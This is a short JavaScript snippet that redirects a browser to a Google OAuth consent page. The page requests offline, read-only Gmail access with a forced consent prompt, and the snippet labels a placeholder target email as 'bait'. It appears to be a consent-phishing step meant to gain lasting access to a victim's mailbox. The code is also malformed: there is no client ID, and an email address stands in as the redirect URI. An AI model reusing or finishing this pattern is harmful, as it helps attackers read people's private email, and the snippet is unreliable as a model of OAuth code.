const bait = '[TARGET EMAIL customer@example.org]';
const authorize = 'https://accounts.google.com/o/oauth2/v2/auth?scope=https://www.googleapis.com/auth/gmail.readonly&access_type=offline&prompt=consent';
location.href = authorize + '&redirect_uri=' + bait;
